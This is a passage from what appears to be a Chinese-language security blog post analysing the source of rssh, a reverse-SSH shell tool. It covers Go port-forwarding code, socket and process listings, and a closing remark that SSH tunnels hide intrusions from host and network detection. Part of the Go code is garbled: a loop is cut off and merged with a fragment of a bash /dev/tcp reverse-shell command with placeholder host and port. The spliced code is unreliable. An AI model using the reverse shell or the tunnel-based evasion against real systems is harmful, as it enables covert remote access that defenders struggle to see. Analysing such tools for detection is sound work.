            uint32(laddr.Port),
        }
        // send message
        ok, resp, err := c.SendRequest("tcpip-forward", true, Marshal(&m))
        if err != nil {
            return nil, err
        }
        if !ok {
            return nil, errors.New("ssh: tcpip-forward request denied by peer")
        }
        // If the original port was 0, then the remote side will
        // supply a real port number in the response.
        if laddr.Port == 0 {
            var p struct {
                Port uint32
            }
            if err := Unmarshal(resp, &p); err != nil {
                return nil, err
            }
            laddr.Port = int(p.Port)
        }
        // Register this forward, using the port number we obtained.
        ch := c.forwards.add(*laddr)
        return &tcpListener{laddr, c, ch}, nil
    }
1.合法性校验
    if laddr.Port == 0 && isBrokenOpenSSHVersion(string(c.ServerVersion())) {
    return c.autoPortListenWorkaround(laddr)
    }
    func (c *Client) autoPortListenWorkaround(laddr *net.TCPAddr) (net.Listener, error) {
        var sshListener net.Listener
        var err error
        const tries = 10
        for i := 0; i & /dev/tcp/ip/port 0>&1**
在客户端创建完毕链接之后，在服务器端运行 nc -c 127.0.0.1 2222，连接到本地的2222端口．此时服务器的网络状态是:
    ss -anptw | grep 2222
    tcp    LISTEN     0      128    127.0.0.1:2222                  *:*                 
    tcp    ESTAB      0      0      127.0.0.1:59070              127.0.0.1:2222                users:(("nc",pid=13449,fd=3))
    tcp    ESTAB      0      0      127.0.0.1:2222               127.0.0.1:59070
    $ ps -ef | grep 13449
    USERNAME   13449  2642  0 17:12 pts/2    00:00:00 nc -c 127.0.0.1 2222
    $ ls -al /proc/13449/fd
    total 0
    dr-x------ 2 USERNAME USERNAME  0 Jun 18 17:12 .
    dr-xr-xr-x 9 USERNAME USERNAME  0 Jun 18 17:12 ..
    lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 0 -> /dev/pts/2
    lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 1 -> /dev/pts/2
    lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 2 -> /dev/pts/2
    lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 3 -> socket:[169479331]
可以发现在服务器端的59070连接了2222端口，进程是13449．由于从客户端接受过来的数据都是经过ssh解密的，所以对于HIDS来说是很难发现异常的．
此时客户端的网络连接状态是：
    $ ss -anptw | grep 22  
    tcp   LISTEN    0       128             0.0.0.0:22               0.0.0.0:*                                                                                     
    tcp   ESTAB     0       0            172.16.1.2:41424      40.77.226.250:443     users:(("code",pid=5822,fd=49))                                               
    tcp   ESTAB     0       0            172.16.1.2:37930      40.77.226.250:443     users:(("code",pid=5822,fd=41))                                               
    tcp   ESTAB     0       0            172.16.1.2:33198     IP.OF.REMOTE.MACHINE:22      users:(("main",pid=32069,fd=5))                                               
    tcp   ESTAB     0       0            172.16.1.2:57664      40.77.226.250:443     users:(("code",pid=5822,fd=40))                                               
    tcp   LISTEN    0       128                [::]:22                  [::]:*
    $ ps -ef | grep 32393
    spoock  32393 32069  0 17:12 pts/4    00:00:00 /bin/sh
    $ ls -al /proc/32393/fd
    dr-x------ 2 spoock spoock  0 Jun 18 17:15 .
    dr-xr-xr-x 9 spoock spoock  0 Jun 18 17:15 ..
    lrwx------ 1 spoock spoock 64 Jun 18 17:15 0 -> /dev/pts/4
    lrwx------ 1 spoock spoock 64 Jun 18 17:15 1 -> /dev/pts/4
    lrwx------ 1 spoock spoock 64 Jun 18 17:15 10 -> /dev/tty
    lrwx------ 1 spoock spoock 64 Jun 18 17:15 2 -> /dev/pts/4
    $ ls -al /proc/32069/fd
    dr-x------ 2 spoock spoock  0 Jun 18 17:01 .
    dr-xr-xr-x 9 spoock spoock  0 Jun 18 17:01 ..
    lrwx------ 1 spoock spoock 64 Jun 18 17:01 0 -> /dev/pts/2
    lrwx------ 1 spoock spoock 64 Jun 18 17:01 1 -> /dev/pts/2
    lrwx------ 1 spoock spoock 64 Jun 18 17:01 2 -> /dev/pts/2
    lrwx------ 1 spoock spoock 64 Jun 18 17:01 3 -> 'socket:[559692]'
    lrwx------ 1 spoock spoock 64 Jun 18 17:01 4 -> 'anon_inode:[eventpoll]'
    lrwx------ 1 spoock spoock 64 Jun 18 17:01 5 -> 'socket:[559693]'
    lrwx------ 1 spoock spoock 64 Jun 18 17:15 6 -> /dev/ptmx
    lrwx------ 1 spoock spoock 64 Jun 18 17:15 7 -> /dev/pts/4
客户端的含义就是：在ssh连接进程中派生出了sh进程，在sh进程中执行命令，但是由于执行的命令全部都是通过ssh加密发送的，在流量上是无法看到。
以上就是整个rssh的源代码的分析了。
## 4 总结
本文通过对[rssh](https://github.com/andrew-d/rssh)的分析，对ssh的端口转发有了一个清晰的认识，同时对如何利用ssh隧道完成端口转发也有了一定的了解。通过ssh隧道来实现入侵，能够很好地隐藏自己的攻击行为，传统的HIDS和NIDS也很难检测到对应的入侵行为。那么有什么方法能够检测出这种利用ssh隧道的入侵行为呢？如果有任何的想法欢迎大家与我交流。
* * *